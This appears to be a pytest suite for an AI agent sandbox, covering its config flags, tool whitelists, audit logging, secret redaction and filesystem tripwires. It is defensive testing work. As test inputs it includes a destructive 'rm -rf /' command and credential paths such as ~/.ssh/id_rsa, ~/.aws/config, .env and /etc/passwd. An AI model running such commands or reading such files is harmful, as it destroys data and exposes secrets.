"""Coverage wave 81c — execution sandbox layer + workflow security gates.

Standalone >=95% targets (all mocked, zero LLM spend, no network, no real DB):
  core/sandbox_policy.py          core/sandbox_config.py
  core/sandbox_audit.py           core/sandbox_fs.py
  core/sandbox_caps.py            core/sandbox_tripwire.py
  core/sandbox_killrun.py         core/sandbox_gate.py
  core/sandbox_egress_proxy.py    core/workflow_security.py

Written from the module sources (fresh cases, not copies of the R43-47 /
w39 / w40 suites) and covering the previously-uncovered lines:
  sandbox_fs.py:116      (resolve-pass branch with cwd + ".." path)
  sandbox_fs.py:380-382  (rewrite ValueError on NUL-byte path)
  workflow_security.py:80, 131, 201-202, 288, 293, 295
"""
from __future__ import annotations

import asyncio
import enum
import threading
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest

from core import sandbox_config
from core import sandbox_policy as sp
from core import workflow_security as ws
from core.sandbox_audit import write_run_policy, write_violation
from core.sandbox_caps import (
    CounterRegistry,
    _RunCounters,
    check_caps,
    estimate_cost_usd,
    estimate_tool_usage,
    estimate_write_bytes,
    get_registry,
    record_cost,
    record_write,
    release_run,
)
from core.sandbox_egress_proxy import (
    LlmProxy,
    ToolProxy,
    _BaseProxy,
    check_egress,
    effective_allowlist,
    extract_urls_from_args,
    get_dual_proxy_split,
    host_matches,
    normalize_host,
    validate as egress_validate,
)
from core.sandbox_fs import (
    _hit_path_tripwire,
    _normalize_path,
    _within_scope,
    extract_paths_from_args,
    rewrite_path_to_sandbox,
    validate as fs_validate,
    validate_path,
)
from core.sandbox_gate import evaluate_tool_call
from core.sandbox_killrun import (
    KillRunAborted,
    KillRunRegistry,
    get_registry as get_killrun_registry,
    guard,
    is_killed,
    trigger_killrun,
)
from core.sandbox_policy import (
    ALLOWED,
    BLOCKED,
    RESTRICTED,
    VT_FS_PATH,
    VT_TOOL_WHITELIST,
    SandboxDecision,
    SandboxDecisionValue,
    SandboxPolicy,
    PolicyIssuer,
    coerce_decision_for_storage,
    coerce_phase_for_storage,
    get_default_issuer,
    new_policy_id,
)
from core.sandbox_tripwire import (
    MegafileDetector,
    MegafileWarning,
    TripwirePattern,
    all_patterns,
    check,
    check_js_ast,
    check_python_ast,
    match,
)


# ===========================================================================
# Shared helpers
# ===========================================================================

def _policy(**kwargs) -> SandboxPolicy:
    defaults = dict(
        run_id="r1",
        agent_id="a1",
        tier_at_issuance="supervised",
        fs_roots=("/workspace/data", "/tmp/agent/r1"),
        fs_write_roots=("/tmp/agent/r1",),
        tool_whitelist=("*",),
        egress_hosts=(),
        max_bytes_written=0,
        max_exec_seconds=0,
        max_tool_calls=0,
        max_cost_usd=0.0,
    )
    defaults.update(kwargs)
    return SandboxPolicy(**defaults)


def _allowed(**kwargs) -> SandboxDecision:
    return SandboxDecision(
        decision=ALLOWED,
        phase="C",
        tool_name=kwargs.get("tool_name", "t"),
        args_hash=kwargs.get("args_hash"),
        metadata_json=kwargs.get("metadata_json", {}),
    )


class _User:
    def __init__(self, id="u1", role="member"):
        self.id = id
        self.role = role


# ===========================================================================
# core/sandbox_config.py
# ===========================================================================

class TestConfigFlags:
    def test_flag_parses_truthy_values(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "1")
        assert sandbox_config.is_sandbox_enabled() is True
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "yes")
        assert sandbox_config.is_sandbox_enabled() is True
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "on")
        assert sandbox_config.is_sandbox_enabled() is True
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "True")
        assert sandbox_config.is_sandbox_enabled() is True

    def test_flag_parses_falsy_values(self, monkeypatch):
        for v in ("0", "no", "off", "false", "FALSE"):
            monkeypatch.setenv("ATOM_SANDBOX_ENABLED", v)
            assert sandbox_config.is_sandbox_enabled() is False

    def test_flag_unset_uses_default(self, monkeypatch):
        monkeypatch.delenv("ATOM_SANDBOX_ENABLED", raising=False)
        assert sandbox_config.is_sandbox_enabled() is True  # P9 default-on
        monkeypatch.delenv("ATOM_SANDBOX_EGRESS_ENABLED", raising=False)
        assert sandbox_config.is_sandbox_egress_enabled() is False  # opt-in

    def test_phase_kill_switches_follow_env(self, monkeypatch):
        for var, fn in (
            ("ATOM_SANDBOX_FORCE_ENFORCE", sandbox_config.is_sandbox_force_enforce_enabled),
            ("ATOM_SANDBOX_FS_ENABLED", sandbox_config.is_sandbox_fs_enabled),
            ("ATOM_SANDBOX_WHITELIST_ENABLED", sandbox_config.is_sandbox_whitelist_enabled),
            ("ATOM_SANDBOX_TRIPWIRES_ENABLED", sandbox_config.is_sandbox_tripwires_enabled),
            ("ATOM_SANDBOX_CAPS_ENABLED", sandbox_config.is_sandbox_caps_enabled),
            ("ATOM_SANDBOX_PROVENANCE_ENABLED", sandbox_config.is_sandbox_provenance_enabled),
        ):
            monkeypatch.setenv(var, "false")
            assert fn() is False
            monkeypatch.setenv(var, "true")
            assert fn() is True

    def test_opt_in_flags_default_off(self, monkeypatch):
        monkeypatch.delenv("ATOM_SANDBOX_EGRESS_ENABLED", raising=False)
        monkeypatch.delenv("ATOM_SANDBOX_JUDGE_ENABLED", raising=False)
        monkeypatch.delenv("ATOM_SANDBOX_POLICY_TENANT_OVERRIDE", raising=False)
        assert sandbox_config.is_sandbox_egress_enabled() is False
        assert sandbox_config.is_sandbox_judge_enabled() is False
        assert sandbox_config.is_sandbox_policy_tenant_override() is False
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_ENABLED", "on")
        assert sandbox_config.is_sandbox_judge_enabled() is True
        monkeypatch.setenv("ATOM_SANDBOX_POLICY_TENANT_OVERRIDE", "yes")
        assert sandbox_config.is_sandbox_policy_tenant_override() is True

    def test_blank_env_value_is_false(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "  ")
        assert sandbox_config.is_sandbox_enabled() is False


class TestConfigRuntime:
    def test_runtime_default_docker(self, monkeypatch):
        monkeypatch.delenv("ATOM_SANDBOX_RUNTIME", raising=False)
        assert sandbox_config.get_sandbox_runtime() == "docker"

    def test_runtime_valid_values(self, monkeypatch):
        for v in ("firecracker", "e2b", "docker"):
            monkeypatch.setenv("ATOM_SANDBOX_RUNTIME", v)
            assert sandbox_config.get_sandbox_runtime() == v

    def test_runtime_invalid_falls_back_docker(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_RUNTIME", "kubernetes")
        assert sandbox_config.get_sandbox_runtime() == "docker"

    def test_runtime_uppercase_normalized(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_RUNTIME", "  FIRECRACKER ")
        assert sandbox_config.get_sandbox_runtime() == "firecracker"


class TestConfigNumerics:
    def test_defaults(self, monkeypatch):
        for var in (
            "ATOM_SANDBOX_MAX_BYTES_WRITTEN", "ATOM_SANDBOX_MAX_EXEC_SECONDS",
            "ATOM_SANDBOX_MAX_TOOL_CALLS", "ATOM_SANDBOX_MAX_COST_USD",
            "ATOM_SANDBOX_VM_MEM_MB", "ATOM_SANDBOX_VM_VCPUS",
            "ATOM_SANDBOX_VM_BOOT_TIMEOUT_SECONDS", "ATOM_SANDBOX_JUDGE_TIMEOUT_SECONDS",
            "ATOM_SANDBOX_JUDGE_CIRCUIT_THRESHOLD", "ATOM_SANDBOX_JUDGE_CIRCUIT_COOLDOWN_SECONDS",
        ):
            monkeypatch.delenv(var, raising=False)
        assert sandbox_config.get_sandbox_max_bytes_written() == 100 * 1024 * 1024
        assert sandbox_config.get_sandbox_max_exec_seconds() == 600
        assert sandbox_config.get_sandbox_max_tool_calls() == 200
        assert sandbox_config.get_sandbox_max_cost_usd() == 5.0
        assert sandbox_config.get_sandbox_vm_mem_mb() == 256
        assert sandbox_config.get_sandbox_vm_vcpus() == 1
        assert sandbox_config.get_sandbox_vm_boot_timeout_seconds() == 5
        assert sandbox_config.get_sandbox_judge_timeout_seconds() == 2.0
        assert sandbox_config.get_sandbox_judge_circuit_threshold() == 5
        assert sandbox_config.get_sandbox_judge_circuit_cooldown_seconds() == 120

    def test_env_set_values_parsed(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_MAX_BYTES_WRITTEN", "1024")
        monkeypatch.setenv("ATOM_SANDBOX_MAX_EXEC_SECONDS", "60")
        monkeypatch.setenv("ATOM_SANDBOX_MAX_TOOL_CALLS", "10")
        monkeypatch.setenv("ATOM_SANDBOX_MAX_COST_USD", "0.25")
        monkeypatch.setenv("ATOM_SANDBOX_VM_MEM_MB", "512")
        monkeypatch.setenv("ATOM_SANDBOX_VM_VCPUS", "4")
        monkeypatch.setenv("ATOM_SANDBOX_VM_BOOT_TIMEOUT_SECONDS", "30")
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_TIMEOUT_SECONDS", "1.5")
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_CIRCUIT_THRESHOLD", "3")
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_CIRCUIT_COOLDOWN_SECONDS", "9")
        assert sandbox_config.get_sandbox_max_bytes_written() == 1024
        assert sandbox_config.get_sandbox_max_exec_seconds() == 60
        assert sandbox_config.get_sandbox_max_tool_calls() == 10
        assert sandbox_config.get_sandbox_max_cost_usd() == 0.25
        assert sandbox_config.get_sandbox_vm_mem_mb() == 512
        assert sandbox_config.get_sandbox_vm_vcpus() == 4
        assert sandbox_config.get_sandbox_vm_boot_timeout_seconds() == 30
        assert sandbox_config.get_sandbox_judge_timeout_seconds() == 1.5
        assert sandbox_config.get_sandbox_judge_circuit_threshold() == 3
        assert sandbox_config.get_sandbox_judge_circuit_cooldown_seconds() == 9

    def test_invalid_env_falls_back_to_default(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_MAX_BYTES_WRITTEN", "abc")
        assert sandbox_config.get_sandbox_max_bytes_written() == 100 * 1024 * 1024
        monkeypatch.setenv("ATOM_SANDBOX_MAX_EXEC_SECONDS", "12.5")
        assert sandbox_config.get_sandbox_max_exec_seconds() == 600
        monkeypatch.setenv("ATOM_SANDBOX_MAX_TOOL_CALLS", "None")
        assert sandbox_config.get_sandbox_max_tool_calls() == 200
        monkeypatch.setenv("ATOM_SANDBOX_MAX_COST_USD", "free")
        assert sandbox_config.get_sandbox_max_cost_usd() == 5.0
        monkeypatch.setenv("ATOM_SANDBOX_VM_MEM_MB", "lots")
        assert sandbox_config.get_sandbox_vm_mem_mb() == 256
        monkeypatch.setenv("ATOM_SANDBOX_VM_VCPUS", "2x")
        assert sandbox_config.get_sandbox_vm_vcpus() == 1
        monkeypatch.setenv("ATOM_SANDBOX_VM_BOOT_TIMEOUT_SECONDS", "never")
        assert sandbox_config.get_sandbox_vm_boot_timeout_seconds() == 5
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_TIMEOUT_SECONDS", "slow")
        assert sandbox_config.get_sandbox_judge_timeout_seconds() == 2.0
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_CIRCUIT_THRESHOLD", "many")
        assert sandbox_config.get_sandbox_judge_circuit_threshold() == 5
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_CIRCUIT_COOLDOWN_SECONDS", "long")
        assert sandbox_config.get_sandbox_judge_circuit_cooldown_seconds() == 120

    def test_negative_values_clamped(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_MAX_BYTES_WRITTEN", "-10")
        assert sandbox_config.get_sandbox_max_bytes_written() == 0
        monkeypatch.setenv("ATOM_SANDBOX_MAX_EXEC_SECONDS", "-1")
        assert sandbox_config.get_sandbox_max_exec_seconds() == 1
        monkeypatch.setenv("ATOM_SANDBOX_MAX_TOOL_CALLS", "0")
        assert sandbox_config.get_sandbox_max_tool_calls() == 1
        monkeypatch.setenv("ATOM_SANDBOX_MAX_COST_USD", "-3.0")
        assert sandbox_config.get_sandbox_max_cost_usd() == 0.0
        monkeypatch.setenv("ATOM_SANDBOX_VM_MEM_MB", "-5")
        assert sandbox_config.get_sandbox_vm_mem_mb() == 64
        monkeypatch.setenv("ATOM_SANDBOX_VM_VCPUS", "0")
        assert sandbox_config.get_sandbox_vm_vcpus() == 1
        monkeypatch.setenv("ATOM_SANDBOX_VM_BOOT_TIMEOUT_SECONDS", "0")
        assert sandbox_config.get_sandbox_vm_boot_timeout_seconds() == 1
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_TIMEOUT_SECONDS", "-2.0")
        assert sandbox_config.get_sandbox_judge_timeout_seconds() == 0.1
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_CIRCUIT_THRESHOLD", "0")
        assert sandbox_config.get_sandbox_judge_circuit_threshold() == 1
        monkeypatch.setenv("ATOM_SANDBOX_JUDGE_CIRCUIT_COOLDOWN_SECONDS", "0")
        assert sandbox_config.get_sandbox_judge_circuit_cooldown_seconds() == 1


# ===========================================================================
# core/sandbox_policy.py
# ===========================================================================

class TestSandboxPolicyModel:
    def test_allows_all_tools_wildcard(self):
        assert _policy().allows_all_tools is True
        assert _policy(tool_whitelist=("a",)).allows_all_tools is False

    def test_tool_allowed(self):
        p = _policy(tool_whitelist=("browser_click", "read_codebase"))
        assert p.tool_allowed("browser_click") is True
        assert p.tool_allowed("shell") is False
        assert _policy().tool_allowed("anything") is True

    def test_to_dict_roundtrip(self):
        d = _policy(run_id="rr").to_dict()
        assert d["run_id"] == "rr"
        assert d["tier_at_issuance"] == "supervised"
        assert d["fs_roots"] == ("/workspace/data", "/tmp/agent/r1")

    def test_decision_value_namespace(self):
        assert SandboxDecisionValue.ALLOWED == ALLOWED
        assert SandboxDecisionValue.RESTRICTED == RESTRICTED
        assert SandboxDecisionValue.BLOCKED == BLOCKED

    def test_is_allowed(self):
        assert SandboxDecision(decision=ALLOWED).is_allowed is True
        assert SandboxDecision(decision=RESTRICTED).is_allowed is False

    def test_requires_review(self):
        assert SandboxDecision(decision=ALLOWED).requires_review is False
        assert SandboxDecision(decision=RESTRICTED).requires_review is True
        assert SandboxDecision(decision=BLOCKED).requires_review is True

    def test_is_terminal_block(self):
        assert SandboxDecision(decision=BLOCKED, killrun_triggered=True).is_terminal_block is True
        assert SandboxDecision(decision=BLOCKED, killrun_triggered=False).is_terminal_block is False
        assert SandboxDecision(decision=RESTRICTED, killrun_triggered=True).is_terminal_block is False
        assert SandboxDecision(decision=ALLOWED).is_terminal_block is False

    def test_to_audit_row(self):
        d = SandboxDecision(decision=BLOCKED, phase="B", tool_name="t", metadata_json={"k": "v"})
        row = d.to_audit_row()
        assert row["decision"] == BLOCKED
        assert row["metadata_json"] == {"k": "v"}
        assert row["tool_name"] == "t"

    def test_coerce_decision_for_storage(self):
        assert coerce_decision_for_storage("restricted") == RESTRICTED
        assert coerce_decision_for_storage("blocked") == BLOCKED
        assert coerce_decision_for_storage("weird") == ALLOWED
        assert coerce_decision_for_storage(None) == ALLOWED

    def test_coerce_phase_for_storage(self):
        assert coerce_phase_for_storage("b") == "B"
        assert coerce_phase_for_storage("C") == "C"
        assert coerce_phase_for_storage("x") == "A"
        assert coerce_phase_for_storage(None) == "A"

    def test_new_policy_id_is_uuid_hex(self):
        pid = new_policy_id()
        assert len(pid) == 36
        assert new_policy_id() != pid


class TestPolicyIssuerIssue:
    def test_student_tier_no_write_roots(self, monkeypatch):
        monkeypatch.delenv("ATOM_SANDBOX_MAX_TOOL_CALLS", raising=False)
        p = PolicyIssuer().issue("r1", "a1", "STUDENT")
        assert p.tier_at_issuance == "student"
        assert p.fs_write_roots == ()
        assert p.tool_whitelist == sp.TIER_FLOOR_TOOL_WHITELISTS["student"]

    def test_unknown_tier_falls_back_student(self):
        p = PolicyIssuer().issue("r1", "a1", "sentient")
        assert p.tier_at_issuance == "student"

    def test_intern_tier_tmp_write_root(self):
        p = PolicyIssuer().issue("r1", "a1", "intern")
        assert p.fs_write_roots == ("/tmp/agent/r1",)
        assert "/tmp/agent/r1" in p.fs_roots

    def test_supervised_tier_uploads_write_root(self):
        p = PolicyIssuer().issue("r1", "a1", "supervised", workspace_data_root="/ws")
        assert set(p.fs_write_roots) == {"/tmp/agent/r1", "/ws/uploads"}

    def test_autonomous_tier_wildcard_tools(self):
        p = PolicyIssuer().issue("r1", "a1", "autonomous")
        assert p.tool_whitelist == ("*",)
        assert "github.com" in p.egress_hosts

    def test_default_data_root(self, monkeypatch, tmp_path):
        monkeypatch.chdir(tmp_path)
        p = PolicyIssuer().issue("r1", "a1", "intern")
        assert p.fs_roots[0] == str((tmp_path / "data" / "workspace").resolve())

    def test_issue_caps_from_config(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_MAX_TOOL_CALLS", "7")
        monkeypatch.setenv("ATOM_SANDBOX_MAX_COST_USD", "1.5")
        p = PolicyIssuer().issue("r1", "a1", "intern")
        assert p.max_tool_calls == 7
        assert p.max_cost_usd == 1.5
        assert p.policy_version == "2026-06-30"
        assert p.tripwire_actions == ()

    def test_tenant_overrides_applied_when_enabled(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_POLICY_TENANT_OVERRIDE", "true")
        p = PolicyIssuer().issue(
            "r1", "a1", "autonomous",
            tenant_overrides={
                "tool_whitelist": ["browser_click"],
                "egress_hosts": ["api.openai.com"],
                "max_tool_calls": 3,
                "max_cost_usd": 0.1,
            },
        )
        assert p.tool_whitelist == ()  # wildcard is NOT in the override set → narrowed to nothing
        assert p.egress_hosts == ("api.openai.com",)
        assert p.max_tool_calls == 3
        assert p.max_cost_usd == 0.1

    def test_tenant_overrides_ignored_when_disabled(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_POLICY_TENANT_OVERRIDE", "false")
        p = PolicyIssuer().issue(
            "r1", "a1", "intern",
            tenant_overrides={"max_tool_calls": 1},
        )
        assert p.max_tool_calls != 1  # untouched

    def test_override_intersects_whitelist(self):
        p = _policy(
            tool_whitelist=("a", "b", "c"), egress_hosts=("h1", "h2"),
            max_bytes_written=100, max_exec_seconds=60, max_tool_calls=10,
            max_cost_usd=1.0,
        )
        out = PolicyIssuer._apply_overrides(
            p,
            {"tool_whitelist": ["b"], "egress_hosts": ["h2"], "max_bytes_written": 5,
             "max_exec_seconds": 6, "max_tool_calls": 7, "max_cost_usd": 0.5},
        )
        assert out.tool_whitelist == ("b",)
        assert out.egress_hosts == ("h2",)
        assert out.max_bytes_written == 5
        assert out.max_exec_seconds == 6
        assert out.max_tool_calls == 7
        assert out.max_cost_usd == 0.5

    def test_override_min_never_widens(self):
        p = _policy(max_tool_calls=10, max_bytes_written=100)
        out = PolicyIssuer._apply_overrides(p, {"max_tool_calls": 99, "max_bytes_written": 1000})
        assert out.max_tool_calls == 10
        assert out.max_bytes_written == 100

    def test_override_invalid_values_ignored(self):
        p = _policy(max_tool_calls=10)
        out = PolicyIssuer._apply_overrides(p, {"max_tool_calls": "abc", "max_cost_usd": []})
        assert out.max_tool_calls == 10
        assert out.max_cost_usd == 0.0


class TestPolicyIssuerCheck:
    def test_sandbox_disabled_short_circuits(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "false")
        d = PolicyIssuer().check(_policy(), "shell", {"cmd": "rm -rf /"}, context={"policy_id": "p1"})
        assert d.decision == ALLOWED
        assert d.metadata_json["reason"] == "sandbox_disabled"
        assert d.args_hash

    def test_tool_not_whitelisted_blocked(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "false")
        p = _policy(tool_whitelist=("browser_click",))
        d = PolicyIssuer().check(p, "shell", {"cmd": "x"}, context={"policy_id": "pid"})
        assert d.decision == BLOCKED
        assert d.violation_type == VT_TOOL_WHITELIST
        assert d.policy_id == "pid"
        assert d.enforced is False

    def test_allowed_tool(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        p = _policy(tool_whitelist=("browser_click",))
        d = PolicyIssuer().check(p, "browser_click", {"selector": "#x"})
        assert d.decision == ALLOWED
        assert d.enforced is False
        assert d.metadata_json["tier"] == "supervised"

    def test_check_passes_phase_through(self):
        d = PolicyIssuer().check(_policy(), "browser_click", {}, phase="B")
        assert d.phase == "B"

    def test_check_empty_context(self):
        d = PolicyIssuer().check(_policy(tool_whitelist=("t",)), "t", {})
        assert d.decision == ALLOWED
        assert d.policy_id is None

    def test_hash_args_redacts_secret_keys(self):
        h = PolicyIssuer._hash_args({"password": "s3cr3t", "nested": {"api_key": "k", "ok": 1}})
        h2 = PolicyIssuer._hash_args({"password": "other", "nested": {"api_key": "k2", "ok": 1}})
        assert h == h2  # secrets are redacted before hashing
        assert h != PolicyIssuer._hash_args({"password": "s3cr3t", "nested": {"api_key": "k", "ok": 2}})

    def test_hash_args_redacts_lists_and_fragments(self):
        h = PolicyIssuer._hash_args({"list": [{"token": "t", "auth": "x"}, "plain"]})
        h2 = PolicyIssuer._hash_args({"list": [{"token": "DIFF", "auth": "y"}, "plain"]})
        assert h == h2

    def test_hash_args_cyclic_payload(self):
        d = {}
        d["self"] = d
        h = PolicyIssuer._hash_args(d)
        h2 = PolicyIssuer._hash_args({"other": 1})
        assert h != h2
        assert len(h) == 64

    def test_hash_args_empty(self):
        assert PolicyIssuer._hash_args({}) == PolicyIssuer._hash_args(None)

    def test_get_default_issuer_singleton(self):
        a = get_default_issuer()
        b = get_default_issuer()
        assert a is b
        assert isinstance(a, PolicyIssuer)


# ===========================================================================
# core/sandbox_audit.py
# ===========================================================================

class TestWriteViolation:
    def test_allowed_not_audited(self):
        with patch("core.database.SessionLocal") as sl:
            write_violation(_allowed(), db=None)
            sl.assert_not_called()

    def test_disabled_sandbox_not_audited(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "false")
        with patch("core.database.SessionLocal") as sl:
            write_violation(SandboxDecision(decision=BLOCKED), db=None)
            sl.assert_not_called()

    def test_writes_with_provided_session(self):
        db = MagicMock()
        violation_cls = MagicMock()
        with patch("core.models.SandboxViolation", violation_cls):
            write_violation(
                SandboxDecision(
                    decision=BLOCKED, phase="B", violation_type=VT_FS_PATH,
                    violation_detail="x", tool_name="t", args_hash="h",
                    enforced=True, killrun_triggered=False, policy_id="p",
                    metadata_json={"a": 1},
                ),
                db=db, tenant_id="t1", workspace_id="w1", agent_id="a1",
                user_id="u1", session_id="s1", run_id="r1",
            )
        violation_cls.assert_called_once()
        kwargs = violation_cls.call_args.kwargs
        assert kwargs["decision"] == BLOCKED
        assert kwargs["policy_id"] == "p"
        assert kwargs["metadata_json"] == {"a": 1}
        assert kwargs["run_id"] == "r1"
        db.add.assert_called_once()
        db.commit.assert_called_once()
        db.close.assert_not_called()  # owned by caller

    def test_writes_with_owned_session(self, monkeypatch):
        session = MagicMock()
        with patch("core.database.SessionLocal", return_value=session), \
             patch("core.models.SandboxViolation", MagicMock()):
            write_violation(SandboxDecision(decision=RESTRICTED), db=None)
        session.add.assert_called_once()
        session.commit.assert_called_once()
        session.close.assert_called_once()

    def test_exception_swallowed(self, caplog):
        with patch("core.models.SandboxViolation", side_effect=RuntimeError("boom")), \
             patch("core.database.SessionLocal", MagicMock()):
            write_violation(SandboxDecision(decision=BLOCKED))  # must not raise
        assert any("sandbox audit write failed" in r.message for r in caplog.records)


class TestWriteRunPolicy:
    def test_disabled_returns_none(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "false")
        assert write_run_policy({}) is None

    def test_success_with_provided_db(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        db = MagicMock()
        with patch("core.sandbox_policy.new_policy_id", return_value="pid-1"):
            pid = write_run_policy(
                {"run_id": "r1", "agent_id": "a1", "tier_at_issuance": "intern",
                 "fs_roots": ["/x"], "fs_write_roots": [], "tool_whitelist": ["t"],
                 "egress_hosts": [], "max_tool_calls": 5, "policy_version": "v1"},
                db=db, tenant_id="t1", workspace_id="w1", user_id="u1", session_id="s1",
            )
        assert pid == "pid-1"
        db.add.assert_called_once()
        db.commit.assert_called_once()
        db.close.assert_not_called()

    def test_success_with_owned_session(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        session = MagicMock()
        with patch("core.database.SessionLocal", return_value=session), \
             patch("core.sandbox_policy.new_policy_id", return_value="pid-2"):
            pid = write_run_policy({"run_id": "r1"})
        assert pid == "pid-2"
        session.add.assert_called_once()
        session.commit.assert_called_once()
        session.close.assert_called_once()

    def test_exception_returns_none(self, monkeypatch, caplog):
        monkeypatch.setenv("ATOM_SANDBOX_ENABLED", "true")
        db = MagicMock()
        db.add.side_effect = RuntimeError("db down")
        with patch("core.models.RunSandbox", MagicMock()):
            assert write_run_policy({"run_id": "r1"}, db=db) is None
        assert any("sandbox run-policy write failed" in r.message for r in caplog.records)


# ===========================================================================
# core/sandbox_fs.py
# ===========================================================================

class TestHitPathTripwire:
    def test_forbidden_prefix_exact_and_prefix(self):
        assert _hit_path_tripwire("/etc", "/home") == "forbidden_prefix:/etc/"
        assert _hit_path_tripwire("/etc/passwd", "/home") == "forbidden_prefix:/etc/"
        assert _hit_path_tripwire("/proc/self/environ", "/home") is not None

    def test_requested_path_checked_too(self):
        assert _hit_path_tripwire("/safe/file", "/home", requested="/etc/passwd") is not None
        assert _hit_path_tripwire("/safe/file", "/home", requested="/safe/file") is None

    def test_home_directory_fragments(self, tmp_path):
        home = str(tmp_path)
        assert _hit_path_tripwire(home + "/.ssh/id_rsa", home) == "forbidden_home:.ssh/"
        assert _hit_path_tripwire(home + "/.ssh", home) == "forbidden_home:.ssh/"
        assert _hit_path_tripwire(home + "/.aws/config", home) == "forbidden_home:.aws/"
        assert _hit_path_tripwire(home + "/.config/foo", home) == "forbidden_home:.config/"

    def test_home_file_fragments(self, tmp_path):
        home = str(tmp_path)
        assert _hit_path_tripwire(home + "/.env", home) == "forbidden_home:.env"
        assert _hit_path_tripwire(home + "/.env.production", home) == "forbidden_home:.env"
        assert _hit_path_tripwire(home + "/.envx", home) is None  # not .env.*

    def test_benign_paths_pass(self, tmp_path):
        assert _hit_path_tripwire(str(tmp_path) + "/notes.txt", str(tmp_path)) is None
        assert _hit_path_tripwire("/tmp/x", "/home/u") is None
        assert _hit_path_tripwire("", "") is None


class TestNormalizePath:
    def test_absolute_path_resolved(self):
        from pathlib import Path

        resolved, trip = _normalize_path("/tmp/agent/r1/file.txt")
        assert resolved == str(Path("/tmp/agent/r1/file.txt").resolve(strict=False))
        assert trip is None

    def test_relative_with_cwd(self):
        resolved, trip = _normalize_path("sub/file.txt", cwd="/tmp/agent/r1")
        assert resolved.endswith("/tmp/agent/r1/sub/file.txt")
        assert trip is None

    def test_relative_without_cwd(self):
        resolved, trip = _normalize_path("some_rel_file")
        assert resolved.startswith("/")
        assert trip is None

    def test_dotdot_with_cwd_hits_resolve_pass(self):
        # ``..`` in the raw path + an explicit cwd that differs from the
        # process CWD makes the second resolve() differ → the pass branch.
        resolved, trip = _normalize_path("sub/../file.txt", cwd="/nonexistent/sbx/cwd")
        assert trip is None
        assert resolved.endswith("/file.txt")

    def test_dotdot_collapses(self):
        resolved, trip = _normalize_path("/tmp/agent/r1/sub/../f", cwd="/x")
        assert resolved.endswith("/tmp/agent/r1/f")

    def test_nul_byte_returns_resolve_error(self):
        resolved, trip = _normalize_path("bad\x00path")
        assert trip == "resolve_error"
        assert resolved == "bad\x00path"

    def test_forbidden_prefix_tripwire(self):
        _, trip = _normalize_path("/etc/passwd")
        assert trip and trip.startswith("forbidden_prefix")

    def test_home_tripwire(self, monkeypatch, tmp_path):
        fake_home = tmp_path / "h"
        fake_home.mkdir()
        monkeypatch.setattr("pathlib.Path.home", staticmethod(lambda: fake_home))
        _, trip = _normalize_path(str(fake_home / ".ssh" / "id_rsa"))
        assert trip == "forbidden_home:.ssh/"


class TestWithinScope:
    def test_empty_roots_false(self):
        assert _within_scope("/tmp/x", ()) is False

    def test_within_root(self):
        assert _within_scope("/tmp/agent/r1/a/b.txt", ("/tmp/agent/r1",)) is True

    def test_outside_roots(self):
        assert _within_scope("/etc/passwd", ("/tmp/agent/r1",)) is False

    def test_multiple_roots(self):
        assert _within_scope("/workspace/data/x", ("/tmp/a", "/workspace/data")) is True


class TestExtractPaths:
    def test_empty_args(self):
        assert extract_paths_from_args({}) == {}
        assert extract_paths_from_args(None) == {}

    def test_picks_known_keys_only(self):
        out = extract_paths_from_args({
            "path": "/a", "file_path": "/b", "filepath": "/c", "filename": "d",
            "output_path": "/e", "output_file": "/f", "save_path": "/g", "dest": "/h",
            "destination": "/i", "cwd": "/j", "working_dir": "/k", "workdir": "/l",
            "selector": "#x", "count": 3,
        })
        assert len(out) == 12

    def test_skips_non_string_and_empty(self):
        assert extract_paths_from_args({"path": None, "file_path": "", "dest": 5}) == {}


class TestValidatePath:
    def test_allowed_within_read_root(self):
        d = validate_path("/workspace/data/f.txt", _policy(), write=False, tool_name="read")
        assert d.decision == ALLOWED
        assert d.phase == "B"

    def test_write_root_selected_for_write(self):
        d = validate_path("/tmp/agent/r1/out.log", _policy(), write=True, tool_name="w")
        assert d.decision == ALLOWED
        assert d.metadata_json["write"] is True

    def test_restricted_outside_roots(self):
        d = validate_path("/elsewhere/x", _policy(), write=False, tool_name="t")
        assert d.decision == RESTRICTED
        assert d.violation_type == VT_FS_PATH
        assert d.metadata_json["roots"] == ["/workspace/data", "/tmp/agent/r1"]
        assert "outside" in d.violation_detail

    def test_blocked_tripwire(self, monkeypatch):
        monkeypatch.setenv("ATOM_SANDBOX_FORCE_ENFORCE", "true")
        d = validate_path("/etc/passwd", _policy(), write=False, tool_name="t", args_hash="h")
        assert d.decision == BLOCKED
        assert d.enforced is True
        assert d.args_hash == "h"
        assert d.metadata_json["requested"] == "/etc/passwd"

